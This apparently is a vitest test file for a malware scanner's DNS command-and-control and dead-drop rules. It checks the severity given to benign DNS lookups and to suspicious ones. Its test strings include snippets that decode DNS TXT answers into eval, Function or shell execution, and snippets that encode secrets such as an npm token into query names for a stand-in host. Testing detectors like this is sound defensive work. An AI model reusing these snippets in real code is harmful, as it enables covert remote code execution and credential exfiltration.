import { performance } from "node:perf_hooks";
import { describe, expect, it } from "vitest";
import {
  ALL_PATTERN_SETS,
  isPatternApplicableToFile,
  matchPatternInContent,
  resolvePatternSeverity,
} from "../patterns.js";
import type { PatternEntry, Severity } from "../types.js";
import { performanceBudget } from "./performance-budget.js";

const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS
    .flatMap(([, set]) => set)
    .find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

/** What the scanner reports: one severity per hit, in hit order. */
function severities(rule: string, content: string, file = "src/dns-check.ts"): Severity[] {
  const entry = shippedRule(rule);
  if (!isPatternApplicableToFile(entry, content, file)) return [];
  return matchPatternInContent(entry, content, "g")
    .map((hit) => resolvePatternSeverity(entry, content, hit));
}

const DNSKEY_OVER_DOH = [
  "export async function dnskey(domain: string) {",
  '  const url = "https://dns.google/resolve?name=" + encodeURIComponent(domain) + "&type=DNSKEY";',
  '  const res = await fetch(url, { headers: { accept: "application/dns-json" } });',
  "  const body = await res.json();",
  '  const digest = createHash("sha256").update(body.Answer[0].data).digest().toString("hex");',
  "  return { body, digest };",
  "}",
].join("\n");

const SPF_LOOKUP = [
  'import { promises as dns } from "node:dns";',
  "export async function spf(domain: string) {",
  "  const records = await dns.resolveTxt(domain);",
  '  return records.map((r) => r.join("")).find((t) => /^v=spf1 /.exec(t));',
  "}",
].join("\n");

describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", () => {
  it("reports a DNSKEY lookup over DoH with a caller-supplied domain below medium", () => {
    const found = severities("C2_DOH_RESOLVER", DNSKEY_OVER_DOH);
    expect(found.length).toBeGreaterThan(0);
    expect(found.every((severity) => severity === "low")).toBe(true);
  });

  it("reports a DNSKEY lookup over DoH with a constant domain below medium", () => {
    const content =
      'const r = await fetch("https://cloudflare-dns.com/dns-query?name=example.com&type=DNSKEY", { headers: { accept: "application/dns-json" } });';
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
  });

  it("reports an SPF lookup via dns.resolveTxt below medium", () => {
    expect(severities("DEAD_DROP_DNS_TXT", SPF_LOOKUP)).toEqual(["low"]);
  });

  it("keeps a DKIM key decode next to RegExp.exec below medium", () => {
    const content = [
      "const [record] = await dns.resolveTxt(`${selector}._domainkey.${domain}`);",
      "const p = /p=([^;]+)/.exec(record.join(\"\"))?.[1] ?? \"\";",
      'const key = Buffer.from(p, "base64");',
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["low"]);
  });

  it("reports a DoH query name built from encoded data at medium", () => {
    const content =
      'fetch("https://dns.google/resolve?name=" + base32(secret) + ".x.example&type=TXT");';
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["medium"]);
  });

  it("reports a DoH query name encoded into a variable on the lines above at medium", () => {
    for (const encode of ["base32(secret)", 'Buffer.from(secret).toString("base64url")']) {
      const content = [
        `const encoded = ${encode};`,
        'const q = encoded + ".x.example";',
        'fetch("https://dns.google/resolve?name=" + q + "&type=TXT");',
      ].join("\n");
      expect(severities("C2_DOH_RESOLVER", content), encode).toEqual(["medium"]);
    }
  });

  it("does not reach an encoder more than five lines above the query", () => {
    const content = [
      "const encoded = base32(secret);",
      ..."abcdef".split("").map((v) => `const ${v} = 1;`),
      'fetch("https://dns.google/resolve?name=example.com&type=TXT");',
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
  });

  it("keeps an encoder call above the query that the query does not use at low", () => {
    const content = [
      'const digest = createHash("sha256").update(record).digest().toString("base64");',
      "log.debug(`record digest ${digest}`);",
      'const res = await fetch("https://dns.google/resolve?name=" + domain + "&type=TXT");',
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
  });

  it("follows the encoder through a helper function and a destructuring assignment", () => {
    const helper = [
      "function buildQuery() {",
      '  return base32(secret) + ".x.example";',
      "}",
      'fetch("https://dns.google/resolve?name=" + buildQuery() + "&type=TXT");',
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", helper)).toEqual(["medium"]);
    const destructured = [
      "const [label] = [base32(secret)];",
      'fetch("https://dns.google/resolve?name=" + label + ".x.example&type=TXT");',
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", destructured)).toEqual(["medium"]);
  });

  it("does not taint a helper by an encoder outside its body", () => {
    const oneLine = [
      "function domainOf(x) { return x.split('.').slice(-2).join('.'); }",
      '  const debugId = crypto.randomBytes(4).toString("hex");',
      "export async function spf(domain) {",
      "  const records = await dns.resolveTxt(domainOf(domain));",
      "}",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", oneLine)).toEqual(["low"]);
    const multiLine = [
      "function domainOf(x) {",
      "  return x.split('.').slice(-2).join('.');",
      "}",
      'const debugId = crypto.randomBytes(4).toString("hex");',
      "const records = await dns.resolveTxt(domainOf(domain));",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", multiLine)).toEqual(["low"]);
  });

  it("stays linear with many hits and long assignment chains above each", { timeout: performanceBudget(60_000) }, () => {
    const block = (i: number): string => {
      const chain = Array.from({ length: 200 }, (_, k) => (k === 0 ? `v${i}_0 = base32(x)` : `v${i}_${k} = v${i}_${k - 1}`)).join("; ");
      return [chain, chain, chain, chain, chain, `fetch("https://dns.google/resolve?name=" + v${i}_199 + "&type=TXT");`].join("\n");
    };
    const content = Array.from({ length: 500 }, (_, i) => block(i)).join("\n");
    const started = performance.now();
    severities("C2_DOH_RESOLVER", content);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });

  it("stays linear on a long line of object-literal fragments", { timeout: performanceBudget(60_000) }, () => {
    const fragments = "{eval: x".repeat(Math.ceil((5 * 1024 * 1024) / 8));
    const content = ['const d = Buffer.from(r, "base64").toString();', fragments, "dns.resolveTxt(domain);"].join("\n");
    const started = performance.now();
    severities("DEAD_DROP_DNS_TXT", content);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });

  it("reads a base64 decode whose argument has its own parentheses", () => {
    // A decode and a process sink, without a code sink: the decode must be seen.
    const content = [
      'const { execSync } = require("child_process");',
      'dns.resolveTxt("cfg.x.example", (e, r) => {',
      '  const cmd = Buffer.from(r.flat().join(""), "base64").toString();',
      "  execSync(cmd);",
      "});",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("stays linear on lines of comma-separated assignments above many hits", { timeout: performanceBudget(60_000) }, () => {
    const assignments = "a=1,".repeat(1_000);
    const block = [assignments, assignments, assignments, assignments, assignments, "dns.resolveTxt(q);"].join("\n");
    const content = Array.from({ length: 3_000 }, () => block).join("\n");
    const started = performance.now();
    severities("DEAD_DROP_DNS_TXT", content);
    expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
  });

  it("does not count comparisons with eval or Function as a sink", () => {
    const content = [
      "if (handler === eval || typeof handler == Function) throw new Error(\"blocked\");",
      'const cfg = Buffer.from(raw, "base64").toString();',
      "const records = await dns.resolveTxt(domain);",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["low"]);
  });

  it.each([
    "const F = globalThis.Function;\nF(payload)();",
    "const { Function: F } = globalThis;\nF(payload)();",
    "(0, eval)(payload);",
    'window["eval"](payload);',
  ])("reports a TXT answer reaching an aliased or indirect sink at medium: %s", (sink) => {
    const content = [
      "dns.resolveTxt(d, (e, r) => {",
      '  const payload = Buffer.from(r[0][0], "base64").toString();',
      sink,
      "});",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("reports a TXT answer handed to an alias of Function at medium", () => {
    const content = [
      "dns.resolveTxt(d, (e, r) => {",
      '  const payload = Buffer.from(r[0][0], "base64").toString();',
      "  const F = Function;",
      "  F(payload)();",
      "});",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("reports a TXT answer decoded into eval at medium", () => {
    const content =
      'dns.resolveTxt(d, (e, r) => eval(Buffer.from(r[0][0], "base64").toString()));';
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("reports a DoH answer decoded into eval elsewhere in the file at medium", () => {
    const content = [
      'const res = await fetch(u, { headers: { accept: "application/dns-json" } });',
      "const j = await res.json();",
      "eval(atob(j.Answer[0].data));",
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["medium"]);
  });

  it("reports a Python TXT query feeding exec of a decoded answer at medium", () => {
    const content = [
      "answer = resolver.query(domain, 'TXT')",
      "exec(base64.b64decode(str(answer[0])))",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content, "pkg/setup.py")).toEqual(["medium"]);
  });

  it("reports a TXT answer handed to child_process at medium", () => {
    const content = [
      'const { execSync } = require("child_process");',
      'dns.resolveTxt(d, (e, r) => execSync(Buffer.from(r[0][0], "hex").toString()));',
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it.each(["C2_DOH_RESOLVER", "DEAD_DROP_DNS_TXT"])(
    "%s names the signal it now requires in its description",
    (rule) => {
      const { description, severity } = shippedRule(rule);
      expect(severity).toBe("medium");
      expect(description).toMatch(/encod/i);
      expect(description).toMatch(/eval/);
      expect(description).toMatch(/child_process/);
      expect(description).toMatch(/\blow\b/);
    },
  );

  it("resolves severity linearly on a 5 MiB file", { timeout: performanceBudget(20_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    // Every line is a hit and a near miss for the decoder and encoder signals.
    const unit = 'dns.resolveTxt(d); Buffer.from(x, "b" + base32 + toString("he\n';
    const content = unit.repeat(Math.ceil(fiveMiB / unit.length)).slice(0, fiveMiB);
    const entry = shippedRule("DEAD_DROP_DNS_TXT");
    const hits = matchPatternInContent(entry, content, "g");
    expect(hits.length).toBeGreaterThan(1000);
    const started = performance.now();
    const resolved = hits.map((hit) => resolvePatternSeverity(entry, content, hit));
    expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
    expect(new Set(resolved)).toEqual(new Set(["low"]));
    // One very long line is scanned once for its single hit.
    const oneLine = `dns.resolveTxt(d); ${"base32 x ".repeat(fiveMiB / 9)}`;
    const longStarted = performance.now();
    expect(resolvePatternSeverity(entry, oneLine, { line: 1, text: "dns.resolveTxt" }))
      .toBe("low");
    expect(performance.now() - longStarted).toBeLessThan(performanceBudget(5_000));
  });
});

describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT: fifth review", () => {
  // A TXT answer executed without a decode, encoders the query reaches through
  // helpers, comma and member assignments, and braces inside strings or regex
  // literals that must not close a helper.
  it.each([
    ["txt_eval_nodecode", "DEAD_DROP_DNS_TXT", "const dns = require(\"dns\").promises;\nasync function go() {\n  const r = await dns.resolveTxt(\"cfg.x.example\");\n  eval(r.map((c) => c.join(\"\")).join(\"\"));\n}", ["medium"]],
    ["txt_new_function_nodecode", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nnew Function(r.flat().join(\"\"))();", ["medium"]],
    ["txt_join_then_base64", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = Buffer.from(r.flat().join(\"\"), \"base64\").toString();\neval(code);", ["medium"]],
    ["txt_enc_variable", "DEAD_DROP_DNS_TXT", "const ENC = \"base64\";\nconst r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = Buffer.from(r[0][0], ENC).toString();\neval(code);", ["medium"]],
    ["txt_hex_decode_parseint", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = r[0][0].match(/../g).map((h) => String.fromCharCode(parseInt(h, 16))).join(\"\");\neval(code);", ["medium"]],
    ["txt_spawn_sh", "DEAD_DROP_DNS_TXT", "const { spawn } = require(\"node:child_process\");\nconst r = await dns.resolveTxt(\"cfg.x.example\");\nspawn(\"sh\", [\"-c\", r.flat().join(\"\")]);", ["medium"]],
    ["query_multiline_call", "DEAD_DROP_DNS_TXT", "await dns.resolveTxt(\n  base32(secret) + \".x.example\",\n);", ["medium"]],
    ["query_helper_far_above", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  return Buffer.from(s).toString(\"hex\");\n}\nconst a = 1;\nconst b = 2;\nconst c = 3;\nconst d = 4;\nconst e = 5;\nconst label = enc(process.env.NPM_TOKEN);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
    ["query_helper_brace_in_string", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  const close = \"}\";\n  return Buffer.from(s).toString(\"hex\") + close;\n}\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
    ["query_helper_brace_in_regex", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  s = s.replace(/}/g, '');\n  return Buffer.from(s).toString(\"hex\");\n}\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
    ["query_comma_decl", "DEAD_DROP_DNS_TXT", "const n = 1, label = base32(secret);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
    ["query_member_assign", "DEAD_DROP_DNS_TXT", "q.name = base32(secret);\nawait dns.resolveTxt(q.name + \".x.example\");", ["medium"]],
    ["query_tostring16", "DEAD_DROP_DNS_TXT", "const label = [...secret].map((c) => c.charCodeAt(0).toString(16)).join(\"\");\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
    ["query_backtick_hex", "DEAD_DROP_DNS_TXT", "const label = Buffer.from(secret).toString(`hex`);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
    ["query_arrow_helper", "DEAD_DROP_DNS_TXT", "const enc = (s) => Buffer.from(s).toString(\"hex\");\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
    ["query_arrow_helper_multiline", "DEAD_DROP_DNS_TXT", "const enc = (s) =>\n  Buffer.from(s).toString(\"hex\");\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
    ["benign_dnssec_hex", "C2_DOH_RESOLVER", "const res = await fetch(\"https://dns.google/resolve?name=\" + d + \"&type=DS\");\nconst digest = createHash(\"sha256\").update(x).digest().toString(\"hex\");", ["low"]],
    ["benign_helper_unclosed_brace_string", "DEAD_DROP_DNS_TXT", "function fmt(s) {\n  const open = \"{\";\n  return s;\n}\nconst hash = createHash(\"md5\").update(x).digest(\"hex\"); const tag = Buffer.from(y).toString(\"hex\");\nawait dns.resolveTxt(fmt(domain));", ["low"]],
  ] as Array<[string, string, string, Severity[]]>)("%s", (_name, rule, content, expected) => {
    expect(severities(rule, content)).toEqual(expected);
  });
});
